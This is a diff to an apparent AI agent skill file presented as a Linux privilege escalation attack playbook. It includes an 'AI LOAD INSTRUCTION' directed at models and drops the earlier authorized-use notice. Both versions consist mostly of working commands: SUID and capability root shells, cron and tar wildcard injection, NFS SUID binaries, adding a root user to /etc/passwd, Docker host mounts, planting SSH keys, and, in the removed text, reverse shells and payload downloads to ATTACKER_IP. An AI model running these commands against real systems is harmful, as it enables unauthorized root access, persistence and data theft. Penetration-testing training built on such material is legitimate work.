@@ -1,512 +1,346 @@
 ---
 name: linux-privilege-escalation
-description: "Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control."
-risk: offensive
-source: community
-author: zebbern
-date_added: "2026-02-27"
+description: >-
+  Linux privilege escalation playbook. Use when you have low-privilege shell access and need to escalate to root via SUID/SGID binaries, capabilities, cron abuse, kernel exploits, misconfigurations, or credential harvesting on Linux systems.
 ---
 
-> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
+# SKILL: Linux Privilege Escalation — Expert Attack Playbook
 
-<!-- security-allowlist: curl-pipe-bash -->
+> **AI LOAD INSTRUCTION**: Expert Linux privesc techniques. Covers enumeration, SUID/SGID, capabilities, cron abuse, kernel exploits, NFS, writable passwd/shadow, LD_PRELOAD, Docker group, and library hijacking. Base models miss subtle escalation paths via capabilities and combined misconfigurations.
 
-# Linux Privilege Escalation
+## 0. RELATED ROUTING
 
-## Purpose
+Before going deep, consider loading:
 
-Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control. This skill enables comprehensive enumeration and exploitation of kernel vulnerabilities, sudo misconfigurations, SUID binaries, cron jobs, capabilities, PATH hijacking, and NFS weaknesses.
+- [container-escape-techniques](../container-escape-techniques/SKILL.md) when the target is a container and you need to escape to host
+- [linux-security-bypass](../linux-security-bypass/SKILL.md) when facing restricted shells, AppArmor, SELinux, or seccomp
+- [linux-lateral-movement](../linux-lateral-movement/SKILL.md) after obtaining root for pivoting to adjacent hosts
+- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) when the host is a Kubernetes node
 
-## Inputs / Prerequisites
+### Advanced Reference
 
-### Required Access
-- Low-privilege shell access to target Linux system
-- Ability to execute commands (interactive or semi-interactive shell)
-- Network access for reverse shell connections (if needed)
-- Attacker machine for payload hosting and receiving shells
+Also load [SUID_CAPABILITIES_TRICKS.md](./SUID_CAPABILITIES_TRICKS.md) when you need:
+- Top 30 SUID binaries with exact exploitation commands (GTFOBins)
+- Capability-specific exploitation for each dangerous cap
+- Custom SUID binary exploitation methodology
 
-### Technical Requirements
-- Understanding of Linux filesystem permissions and ownership
-- Familiarity with common Linux utilities and scripting
-- Knowledge of kernel versions and associated vulnerabilities
-- Basic understanding of compilation (gcc) for custom exploits
+Also load [KERNEL_EXPLOITS_CHECKLIST.md](./KERNEL_EXPLOITS_CHECKLIST.md) when you need:
+- Kernel version → exploit mapping table (DirtyPipe, DirtyCow, OverlayFS, etc.)
+- Exploit compilation tips and cross-compilation notes
+- Kernel exploit stability assessment
 
-### Recommended Tools
-- LinPEAS, LinEnum, or Linux Smart Enumeration scripts
-- Linux Exploit Suggester (LES)
-- GTFOBins reference for binary exploitation
-- John the Ripper or Hashcat for password cracking
-- Netcat or similar for reverse shells
+---
 
-## Outputs / Deliverables
+## 1. ENUMERATION CHECKLIST
 
-### Primary Outputs
-- Root shell access on target system
-- Privilege escalation path documentation
-- System enumeration findings report
-- Recommendations for remediation
+Run these immediately after landing a shell:
 
-### Evidence Artifacts
-- Screenshots of successful privilege escalation
-- Command output logs demonstrating root access
-- Identified vulnerability details
-- Exploited configuration files
-
-## Core Workflow
-
-### Phase 1: System Enumeration
-
-#### Basic System Information
-Gather fundamental system details for vulnerability research:
+### System Info
 
 ```bash
-# Hostname and system role
-hostname
-
-# Kernel version and architecture
-uname -a
-
-# Detailed kernel information
-cat /proc/version
-
-# Operating system details
-cat /etc/issue
-cat /etc/*-release
-
-# Architecture
-arch
+uname -a                        # Kernel version
+cat /etc/os-release             # Distro and version
+cat /proc/version               # Kernel compile info
+hostname && id && whoami        # Current context
 ```
 
-#### User and Permission Enumeration
+### Sudo & SUID/SGID
 
 ```bash
-# Current user context
-whoami
-id
-
-# Users with login shells
-cat /etc/passwd | grep -v nologin | grep -v false
-
-# Users with home directories
-cat /etc/passwd | grep home
-
-# Group memberships
-groups
-
-# Other logged-in users
-w
-who
+sudo -l                         # What can we run as root?
+find / -perm -4000 -type f 2>/dev/null   # SUID binaries
+find / -perm -2000 -type f 2>/dev/null   # SGID binaries
+getcap -r / 2>/dev/null         # Files with capabilities
 ```
 
-#### Network Information
+### Cron & Timers
 
 ```bash
-# Network interfaces
-ifconfig
-ip addr
-
-# Routing table
-ip route
-
-# Active connections
-netstat -antup
-ss -tulpn
-
-# Listening services
-netstat -l
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+systemctl list-timers --all     # systemd timers
 ```
 
-#### Process and Service Enumeration
+### Writable Files & Dirs
 
 ```bash
-# All running processes
-ps aux
-ps -ef
-
-# Process tree view
-ps axjf
-
-# Services running as root
-ps aux | grep root
+find / -writable -type f 2>/dev/null | grep -v proc
+ls -la /etc/passwd /etc/shadow  # Check permissions
+find / -perm -o+w -type d 2>/dev/null   # World-writable dirs
 ```
 
-#### Environment Variables
+### Network & Services
 
 ```bash
-# Full environment
-env
-
-# PATH variable (for hijacking)
-echo $PATH
+ss -tlnp                        # Listening services
+cat /proc/net/tcp               # Raw TCP connections
+ps aux                          # Running processes
+env                             # Environment variables (credentials?)
 ```
 
-### Phase 2: Automated Enumeration
-
-Deploy automated scripts for comprehensive enumeration:
+### Credential Locations
 
 ```bash
-# LinPEAS
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
-
-# LinEnum
-./LinEnum.sh -t
-
-# Linux Smart Enumeration
-./lse.sh -l 1
-
-# Linux Exploit Suggester
-./les.sh
+cat ~/.bash_history
+cat ~/.mysql_history
+find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -30
+find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
 ```
 
-Transfer scripts to target system:
+---
+
+## 2. SUID/SGID EXPLOITATION
+
+### GTFOBins Methodology
+
+1. Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
+2. Cross-reference each with [GTFOBins](https://gtfobins.github.io/)
+3. Use the "SUID" section specifically — not all binary abuse works with SUID
+
+### Quick-Win SUID Escalations
+
+| Binary | Command |
+|---|---|
+| `bash` | `bash -p` |
+| `find` | `find . -exec /bin/sh -p \; -quit` |
+| `vim` | `vim -c ':!/bin/sh'` |
+| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
+| `env` | `env /bin/sh -p` |
+| `nmap` (old) | `nmap --interactive` → `!sh` |
+| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
+| `less` | `less /etc/passwd` → `!/bin/sh` |
+| `cp` | Copy `/etc/passwd`, add root user, copy back |
+
+### Shared Library Hijacking (SUID Binary)
 
 ```bash
-# On attacker machine
-python3 -m http.server 8000
+ldd /usr/local/bin/suid_binary                    # Check loaded libraries
+strace /usr/local/bin/suid_binary 2>&1 | grep -i "open.*\.so"  # Find load paths
 
-# On target machine
-wget http://ATTACKER_IP:8000/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
+# If it loads from a writable directory — inject constructor:
+gcc -shared -fPIC -o /writable/path/libevil.so evil.c
+# evil.c: __attribute__((constructor)) → setuid(0); system("/bin/bash -p")
 ```
 
-### Phase 3: Kernel Exploits
+---
 
-#### Identify Kernel Version
+## 3. CAPABILITIES ABUSE
+
+| Capability | Risk | Exploitation |
+|---|---|---|
+| `cap_setuid` | **Critical** | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
+| `cap_dac_override` | **Critical** | Read/write any file regardless of permissions |
+| `cap_dac_read_search` | **High** | Read any file — dump `/etc/shadow` |
+| `cap_sys_admin` | **Critical** | Mount filesystems, BPF, namespace manipulation |
+| `cap_sys_ptrace` | **High** | Inject into root processes via ptrace |
+| `cap_net_raw` | **Medium** | Sniff traffic, ARP spoofing |
+| `cap_net_bind_service` | **Low** | Bind to privileged ports (<1024) |
+| `cap_fowner` | **High** | Change ownership of any file |
 
 ```bash
-uname -r
-cat /proc/version
+# Find binaries with capabilities
+getcap -r / 2>/dev/null
+
+# Example: python3 with cap_setuid
+# /usr/bin/python3 = cap_setuid+ep
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-#### Search for Exploits
+---
+
+## 4. CRON / TIMER ABUSE
+
+### Writable Cron Scripts
 
 ```bash
-# Use Linux Exploit Suggester
-./linux-exploit-suggester.sh
+# Find cron jobs running as root
+cat /etc/crontab | grep root
+ls -la /etc/cron.d/
 
-# Manual search on exploit-db
-searchsploit linux kernel [version]
+# If a root-owned cron runs a script writable by current user:
+echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /writable/script.sh
+# Wait for cron → /tmp/bash -p
 ```
 
-#### Common Kernel Exploits
-
-| Kernel Version | Exploit | CVE |
-|---------------|---------|-----|
-| 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |
-| 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |
-| 5.8+ | Dirty Pipe | CVE-2022-0847 |
-
-#### Compile and Execute
+### PATH Hijacking in Cron
 
 ```bash
-# Transfer exploit source
-wget http://ATTACKER_IP/exploit.c
-
-# Compile on target
-gcc exploit.c -o exploit
-
-# Execute
-./exploit
+# If crontab has: PATH=/home/user:/usr/local/bin:/usr/bin
+# And runs: * * * * * root backup.sh (without full path)
+# Create /home/user/backup.sh:
+echo '#!/bin/bash' > /home/user/backup.sh
+echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh
+chmod +x /home/user/backup.sh
 ```
 
-### Phase 4: Sudo Exploitation
-
-#### Enumerate Sudo Privileges
+### Wildcard Injection (tar)
 
 ```bash
-sudo -l
+# If cron runs: tar czf /backup/archive.tar.gz *
+# In the target directory, create:
+echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > "--checkpoint=1"
+# tar interprets filenames as arguments
 ```
 
-#### GTFOBins Sudo Exploitation
-Reference https://gtfobins.github.io for exploitation commands:
+### pspy — Monitor Processes Without Root
 
 ```bash
-# Example: vim with sudo
-sudo vim -c ':!/bin/bash'
-
-# Example: find with sudo
-sudo find . -exec /bin/sh \; -quit
-
-# Example: awk with sudo
-sudo awk 'BEGIN {system("/bin/bash")}'
-
-# Example: python with sudo
-sudo python -c 'import os; os.system("/bin/bash")'
-
-# Example: less with sudo
-sudo less /etc/passwd
-!/bin/bash
+# Upload pspy64 or pspy32 to target
+./pspy64
+# Watch for cron jobs, services, and background processes
 ```
 
-#### LD_PRELOAD Exploitation
-When env_keep includes LD_PRELOAD:
+---
 
-```c
-// shell.c
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
-
-void _init() {
-    unsetenv("LD_PRELOAD");
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
-}
-```
+## 5. NFS NO_ROOT_SQUASH
 
 ```bash
-# Compile shared library
-gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+# On attacker: check exported shares
+showmount -e TARGET_IP
 
-# Execute with sudo
-sudo LD_PRELOAD=/tmp/shell.so find
+# If no_root_squash is set:
+mount -t nfs TARGET_IP:/share /mnt/nfs
+# As root on attacker box:
+cp /bin/bash /mnt/nfs/bash
+chmod +s /mnt/nfs/bash
+
+# On target:
+/share/bash -p    # root shell
 ```
 
-### Phase 5: SUID Binary Exploitation
+---
 
-#### Find SUID Binaries
+## 6. WRITABLE /etc/passwd OR /etc/shadow
 
-```bash
-find / -type f -perm -04000 -ls 2>/dev/null
-find / -perm -u=s -type f 2>/dev/null
-```
-
-#### Exploit SUID Binaries
-Reference GTFOBins for SUID exploitation:
-
-```bash
-# Example: base64 for file reading
-LFILE=/etc/shadow
-base64 "$LFILE" | base64 -d
-
-# Example: cp for file writing
-cp /bin/bash /tmp/bash
-chmod +s /tmp/bash
-/tmp/bash -p
-
-# Example: find with SUID
-find . -exec /bin/sh -p \; -quit
-```
-
-#### Password Cracking via SUID
-
-```bash
-# Read shadow file (if base64 has SUID)
-base64 /etc/shadow | base64 -d > shadow.txt
-base64 /etc/passwd | base64 -d > passwd.txt
-
-# On attacker machine
-unshadow passwd.txt shadow.txt > hashes.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-```
-
-#### Add User to passwd (if nano/vim has SUID)
+### Writable /etc/passwd
 
 ```bash
 # Generate password hash
-openssl passwd -1 -salt new newpassword
+openssl passwd -1 -salt xyz password123
+# → $1$xyz$...hash...
 
-# Add to /etc/passwd (using SUID editor)
-newuser:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
+# Append root-equivalent user
+echo 'hacker:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
+
+# Or replace root's 'x' with generated hash (if no shadow file)
 ```
 
-### Phase 6: Capabilities Exploitation
-
-#### Enumerate Capabilities
+### Writable /etc/shadow
 
 ```bash
-getcap -r / 2>/dev/null
+# Generate SHA-512 hash
+mkpasswd -m sha-512 password123
+
+# Replace root's hash in /etc/shadow
 ```
 
-#### Exploit Capabilities
+---
+
+## 7. LD_PRELOAD / LD_LIBRARY_PATH WITH SUDO
 
 ```bash
-# Example: python with cap_setuid
-/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-
-# Example: vim with cap_setuid
-./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
-
-# Example: perl with cap_setuid
-perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+# If sudo -l shows: env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
+# Compile .so with _init() that calls setresuid(0,0,0) + system("/bin/bash -p")
+gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
+sudo LD_PRELOAD=/tmp/pe.so /usr/bin/some_allowed_binary
 ```
 
-### Phase 7: Cron Job Exploitation
+---
 
-#### Enumerate Cron Jobs
+## 8. DOCKER GROUP → ROOT
 
 ```bash
-# System crontab
-cat /etc/crontab
+# If current user is in the docker group:
+id    # check for "docker" in groups
 
-# User crontabs
-ls -la /var/spool/cron/crontabs/
+# Mount host filesystem
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
-# Cron directories
-ls -la /etc/cron.*
-
-# Systemd timers
-systemctl list-timers
+# Or add SSH key
+docker run -v /root:/mnt --rm -it alpine sh -c \
+  'echo "ssh-rsa AAAA..." >> /mnt/.ssh/authorized_keys'
 ```
 
-#### Exploit Writable Cron Scripts
+---
+
+## 9. PYTHON / PERL / RUBY LIBRARY HIJACKING
 
 ```bash
-# Identify writable cron script from /etc/crontab
-ls -la /opt/backup.sh        # Check permissions
-echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh
+# Python: if a root-executed script does "import somelib"
+# Check python path order:
+python3 -c 'import sys; print("\n".join(sys.path))'
 
-# If cron references non-existent script in writable PATH
-echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/antivirus.sh
-chmod +x /home/user/antivirus.sh
+# Place malicious module in writable path that comes first:
+cat > /writable/path/somelib.py << 'EOF'
+import os
+os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
+EOF
+
+# Perl: PERL5LIB / @INC manipulation
+# Ruby: RUBYLIB / $LOAD_PATH manipulation
 ```
 
-### Phase 8: PATH Hijacking
+---
 
-```bash
-# Find SUID binary calling external command
-strings /usr/local/bin/suid-binary
-# Shows: system("service apache2 start")
+## 10. AUTOMATED TOOLS
 
-# Hijack by creating malicious binary in writable PATH
-export PATH=/tmp:$PATH
-echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
-chmod +x /tmp/service
-/usr/local/bin/suid-binary      # Execute SUID binary
+| Tool | Purpose | Command |
+|---|---|---|
+| **LinPEAS** | Comprehensive enumeration | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
+| **linux-exploit-suggester** | Kernel exploit suggestions | `./linux-exploit-suggester.sh` |
+| **pspy** | Monitor processes (no root needed) | `./pspy64` |
+| **LinEnum** | Legacy enumeration | `./LinEnum.sh -t` |
+| **GTFOBins** | SUID/sudo/capability abuse reference | https://gtfobins.github.io/ |
+
+---
+
+## 11. PRIVILEGE ESCALATION DECISION TREE
+
 ```
-
-### Phase 9: NFS Exploitation
-
-```bash
-# On target - look for no_root_squash option
-cat /etc/exports
-
-# On attacker - mount share and create SUID binary
-showmount -e TARGET_IP
-mount -o rw TARGET_IP:/share /tmp/nfs
-
-# Create and compile SUID shell
-echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/nfs/shell.c
-gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell
-
-# On target - execute
-/share/shell
+Low-privilege shell obtained
+│
+├── sudo -l shows entries?
+│   ├── GTFOBins match? → exploit directly
+│   ├── env_keep has LD_PRELOAD? → LD_PRELOAD hijack (§7)
+│   ├── NOPASSWD on custom script? → review script for injection
+│   └── (ALL) with password? → check for password reuse/hashes
+│
+├── SUID/SGID binaries found?
+│   ├── Standard binary on GTFOBins? → SUID exploit (§2)
+│   ├── Custom binary? → reverse engineer, check libs (strace/ltrace)
+│   └── Shared lib from writable path? → library hijack (§2)
+│
+├── Capabilities on binaries?
+│   ├── cap_setuid? → instant root (§3)
+│   ├── cap_dac_override? → write /etc/passwd (§6)
+│   ├── cap_sys_admin? → mount / namespace tricks
+│   └── cap_sys_ptrace? → process injection
+│
+├── Cron jobs running as root?
+│   ├── Writable script? → inject payload (§4)
+│   ├── Missing full path? → PATH hijack (§4)
+│   └── Uses wildcards? → wildcard injection (§4)
+│
+├── Writable sensitive files?
+│   ├── /etc/passwd writable? → add root user (§6)
+│   ├── /etc/shadow writable? → replace root hash (§6)
+│   └── systemd unit files writable? → add ExecStartPre
+│
+├── Docker/LXD group membership?
+│   └── Yes → mount host filesystem (§8)
+│
+├── NFS shares with no_root_squash?
+│   └── Yes → SUID binary via NFS (§5)
+│
+├── Kernel version old/unpatched?
+│   └── Check KERNEL_EXPLOITS_CHECKLIST.md
+│
+└── None of the above?
+    ├── Run LinPEAS for comprehensive scan
+    ├── Check for password reuse (bash_history, config files)
+    ├── Check internal services (127.0.0.1 listeners)
+    └── Monitor processes with pspy for hidden opportunities
 ```
-
-## Quick Reference
-
-### Enumeration Commands Summary
-| Purpose | Command |
-|---------|---------|
-| Kernel version | `uname -a` |
-| Current user | `id` |
-| Sudo rights | `sudo -l` |
-| SUID files | `find / -perm -u=s -type f 2>/dev/null` |
-| Capabilities | `getcap -r / 2>/dev/null` |
-| Cron jobs | `cat /etc/crontab` |
-| Writable dirs | `find / -writable -type d 2>/dev/null` |
-| NFS exports | `cat /etc/exports` |
-
-### Reverse Shell One-Liners
-```bash
-# Bash
-bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
-
-# Python
-python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
-
-# Netcat
-nc -e /bin/bash ATTACKER_IP 4444
-
-# Perl
-perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
-```
-
-### Key Resources
-- GTFOBins: https://gtfobins.github.io
-- LinPEAS: https://github.com/carlospolop/PEASS-ng
-- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
-
-## Constraints and Guardrails
-
-### Operational Boundaries
-- Verify kernel exploits in test environment before production use
-- Failed kernel exploits may crash the system
-- Document all changes made during privilege escalation
-- Maintain access persistence only as authorized
-
-### Technical Limitations
-- Modern kernels may have exploit mitigations (ASLR, SMEP, SMAP)
-- AppArmor/SELinux may restrict exploitation techniques
-- Container environments limit kernel-level exploits
-- Hardened systems may have restricted sudo configurations
-
-### Legal and Ethical Requirements
-- Written authorization required before testing
-- Stay within defined scope boundaries
-- Report critical findings immediately
-- Do not access data beyond scope requirements
-
-## Examples
-
-### Example 1: Sudo to Root via find
-
-**Scenario**: User has sudo rights for find command
-
-```bash
-$ sudo -l
-User user may run the following commands:
-    (root) NOPASSWD: /usr/bin/find
-
-$ sudo find . -exec /bin/bash \; -quit
-# id
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-### Example 2: SUID base64 for Shadow Access
-
-**Scenario**: base64 binary has SUID bit set
-
-```bash
-$ find / -perm -u=s -type f 2>/dev/null | grep base64
-/usr/bin/base64
-
-$ base64 /etc/shadow | base64 -d
-root:$6$xyz...:18000:0:99999:7:::
-
-# Crack offline with john
-$ john --wordlist=rockyou.txt shadow.txt
-```
-
-### Example 3: Cron Job Script Hijacking
-
-**Scenario**: Root cron job executes writable script
-
-```bash
-$ cat /etc/crontab
-* * * * * root /opt/scripts/backup.sh
-
-$ ls -la /opt/scripts/backup.sh
--rwxrwxrwx 1 root root 50 /opt/scripts/backup.sh
-
-$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh
-
-# Wait 1 minute
-$ /tmp/bash -p
-# id
-uid=1000(user) gid=1000(user) euid=0(root)
-```
-
-## Troubleshooting
-
-| Issue | Solutions |
-|-------|-----------|
-| Exploit compilation fails | Check for gcc: `which gcc`; compile on attacker for same arch; use `gcc -static` |
-| Reverse shell not connecting | Check firewall; try ports 443/80; use staged payloads; check egress filtering |
-| SUID binary not exploitable | Verify version matches GTFOBins; check AppArmor/SELinux; some binaries drop privileges |
-| Cron job not executing | Verify cron running: `service cron status`; check +x permissions; verify PATH in crontab |
-
-## When to Use
-This skill is applicable to execute the workflow or actions described in the overview.
